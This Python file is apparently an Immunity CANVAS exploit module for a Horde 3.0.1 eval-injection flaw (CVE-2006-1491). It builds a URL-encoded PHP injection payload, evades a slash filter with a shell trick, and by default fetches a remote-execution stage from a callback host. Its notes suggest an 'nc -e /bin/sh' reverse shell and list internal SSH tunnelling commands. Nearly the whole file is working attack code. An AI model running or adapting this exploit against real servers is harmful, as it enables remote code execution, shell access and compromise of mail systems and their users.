#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")


from exploitutils import *
from tcpexploit import tcpexploit

NAME="Horde Eval"
DESCRIPTION="Poor input validation allows remote users to call eval with their own contents"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Horde.org"
DOCUMENTATION["Notes"]="Try using nc <localhost> <localport> -e /bin/sh as your command and having a nc -vlp <localport>"
DOCUMENTATION["Repeatability"]="Infinite"
DOCUMENTATION["CVE Name"] = "CVE-2006-1491"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-1491"
DOCUMENTATION['CVSS'] = 7.5

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux"] ]
PROPERTY['VERSION'] = [ "All" ]

NOTES="""
From rabbit:
   ssh dave@rabbit.immunityinc.com -L 8181:192.168.1.41:80

    ssh root@192.168.1.41
    exploits/horde_eval/horde_eval.py -t localhost -p 8181 -l 192.168.1.1 -d 5555

Works on Horde 3.0.1 or <

#this will run the exploit itself with no "command". Use -O command:"touch /tmp/hi" if you like 
#instead. By default it calls back to a hardcoded IP and port and then downloads a file and
#executes it. 
user@your-dcc2c4d146 /cygdrive/f/JustJuice/CANVAS
$ exploits/horde_eval/horde_eval.py -t rabbit.immunityinc.com -O basepath:"/horde-3.0.1/" -l LOCALHOST -d 5555

#really you want Hydrogen.whatever here. Pay attention to when it prints out "Clientline: Linux" in
case it's not Linux...
user@your-dcc2c4d146 /cygdrive/f/JustJuice/CANVAS
$ ./commandlineInterface.py -v 7 -f canvasengine.py -p 5555
"""

CHANGELOG="""

"""


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.port=80
        self.host=""
        self.shellcode="\xcc" * 298
        self.badstring="\x00"
        self.setVersions()
        self.version=1
        self.done=0
        self.name=NAME    
        self.basepath="/"
        self.command=None #none by default. We want to try to automatically load MOSDEF
        return

    def getargs(self):
        """
        Get arguments for attack
        """
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        self.basepath=self.argsDict.get("basepath",self.basepath)
        self.command=self.argsDict.get("command",self.command)
        self.ssl=self.argsDict.get("ssl",self.ssl)
        return 
    
    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        self.versions[1]=["Horde 3.0.1 or <"]

    def neededListenerTypes(self):
        import canvasengine
        return [canvasengine.PHPMULTI]
        
    def test(self):
        """
        Quicky banner check for Horde - looks for comon basepaths
        """
        self.getargs()
        self.log("Using basepath=%s"%self.basepath)
        if self.C_isOpen(self.host, self.port)!="Open":
            self.log("Web server port not open, horde not found")
            return 0
            
        #automatically check out some common basepaths, starting with the one specified
        for basepath in [self.basepath, "/horde", "/horde-3.0.1","/mail","/webmail","/"]:
            self.log("Testing for basepath: %s"%basepath)
            ret=self.bannerchecktest({"Horde":1}, sendstr="GET %s/login.php HTTP/1.0\r\n\r\n"%basepath)
            if ret:
                self.argsDict["basepath"]=basepath
                self.basepath=basepath
                return ret
        return 0
    
    def run(self):
        self.getargs()
        
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))

        if self.version==0:
            ret=self.test()
            if not ret:
                self.log("Testing didn't find Horde")
                return 0

        self.log("Attacking %s:%d"%(self.host,self.port))
        sploitstring=self.makesploit()
        ret=0
        try:
            #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s=self.gettcpsock()
            s.connect((self.host, self.port))
            self.websend(s,sploitstring)
            self.log("Sent attack")
            if 1 or self.command:
                data=self.webrecv(s)
                self.log("Recved data: %s"%data)
                if data.count("GNU"):
                    ret=1 #we found our page...probably worked
        except:
            #import traceback
            #traceback.print_exc(file=sys.stdout)
            self.log("Attack reported no open socket - service died?")
            self.setInfo("%s attacking %s:%d - done (failed?)"%(NAME,self.host,self.port))
            return 0
        ret=self.ISucceeded()
        if ret:
            self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
        else:
            self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
        return ret
    
    def get_php_to_mosdef(self):
        """
        Creates a string which when included in php's eval() will download and execute
        MOSDEF
        """
        #self.log("Note: You need to input a command for horde . . . automatic loading of MOSDEF will be in a future release")
        
        localhost=self.callback.ip
        localport=self.callback.port
        self.log("Using PHPMULTI callback of %s:%d"%(localhost,localport))
        #ret="touch /tmp/canvas" #tester
        from phplistener import get_php_stage1 #get our "Shellcode"
        
        if 1:
            #cannot use / in this code
            badchars="/"
            ret=get_php_stage1(badchars,localhost,localport)
            
        return ret
        
    def makesploit(self):
        """
        Construct the attack
        GET /horde-3.0.1/services/help?module=%22%3b%70%61%73%73%74%68%72%75%28%27touch+
        %60pwd%7Ccut+-b1%60tmp%60pwd%7Ccut+-b1%60hi4%27%29%3B&show=about HTTP/1.0
        Host: localhost
        User-Agent: bob
        """
        import urllib
        sploitstring=""
        
        #escapestring=urllib.quote_plus("\";passthru(\'")
        if self.command:
            self.log("Command: %s"%self.command)
            command=self.command
            command="\";passthru(\'"+command+"');"
        else:
            #add quote and semicolon to front of it
            command="\";"+self.get_php_to_mosdef()
        #/ is not allowed, so we replace it with this little trick
        command=command.replace("/","`pwd|cut -b1`") 
        self.log("Command: %s"%command)
        command=urllib.quote_plus(command)
        if self.basepath[-1]=="/": self.basepath=self.basepath[:-1] #strip final / if there
        sploitstring="GET %s/services/help/?module=%s&show=about HTTP/1.0\r\nHost: localhost\r\nUser-Agent: bob\r\n\r\n"%(self.basepath,command)  
        self.log("Sending: %s"%sploitstring)
        return sploitstring
    
    def shutdown(self):
        self.done=1


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    
